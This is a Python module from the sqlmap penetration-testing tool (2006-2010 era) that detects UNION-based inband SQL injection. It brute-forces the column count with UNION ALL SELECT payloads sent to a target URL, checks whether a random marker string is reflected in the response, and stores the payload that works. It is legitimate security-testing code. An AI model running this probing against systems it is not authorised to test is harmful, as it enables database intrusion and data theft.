#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.session import setUnion
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request

def __unionPosition(negative=False, count=None, comment=None):
    validPayload = None

    if count is None:
        count = kb.unionCount

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for exprPosition in range(0, count):
        # Prepare expression with delimiters
        randQuery = randomStr()
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, exprPosition, count=count, comment=comment)
        payload = agent.payload(newValue=query, negative=negative)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, content=True)

        if resultPage and randQuery in resultPage:
            setUnion(position=exprPosition)
            validPayload = payload

            break

    return validPayload

def __unionConfirm(count=None, comment=None):
    validPayload = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    if not isinstance(kb.unionPosition, int):
        debugMsg = "testing full inband with %s columns" % count
        logger.debug(debugMsg)

        validPayload = __unionPosition(count=count, comment=comment)

        # Assure that the above function found the exploitable full inband
        # SQL injection position
        if not isinstance(kb.unionPosition, int):
            debugMsg = "testing single-entry inband value with %s columns" % count
            logger.debug(debugMsg)

            validPayload = __unionPosition(negative=True, count=count, comment=comment)

            # Assure that the above function found the exploitable partial
            # (single entry) inband SQL injection position with negative
            # parameter validPayload
            if not isinstance(kb.unionPosition, int):
                return None
            else:
                setUnion(negative=True)

    return validPayload

def __unionTestByCharBruteforce(comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    query = agent.prefixQuery("UNION ALL SELECT %s" % conf.uChar)

    for count in range(conf.uColsStart, conf.uColsStop+1):
        if kb.dbms == DBMS.ORACLE and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", %s" % conf.uChar

        if kb.dbms == DBMS.ORACLE:
            query += " FROM DUAL"

        validPayload = __unionConfirm(count, comment)

        if validPayload:
            setUnion(count=count)
            break

    return validPayload

def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    if kb.unionTest is not None:
        return kb.unionTest

    oldTechnique = kb.technique
    kb.technique = 3

    if conf.uChar == "NULL":
        technique = "NULL bruteforcing"
    else:
        technique = "char (%s) bruteforcing" % conf.uChar

    infoMsg  = "testing inband sql injection on parameter "
    infoMsg += "'%s' with %s technique" % (kb.injection.parameter, technique)
    logger.info(infoMsg)

    comment = queries[kb.dbms].comment.query
    validPayload = __unionTestByCharBruteforce(comment)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload, False)
        setUnion(char=conf.uChar)
        setUnion(comment=comment)
        setUnion(payload=validPayload)

    if kb.unionTest is not None:
        infoMsg = "the target url is affected by an exploitable "
        infoMsg += "inband sql injection vulnerability "
        infoMsg += "on parameter '%s' with %d columns" % (kb.injection.parameter, kb.unionCount)
        logger.info(infoMsg)
    else:
        infoMsg = "the target url is not affected by an exploitable "
        infoMsg += "inband sql injection vulnerability "
        infoMsg += "on parameter '%s'" % kb.injection.parameter
        logger.info(infoMsg)
        kb.technique = oldTechnique

    return kb.unionTest
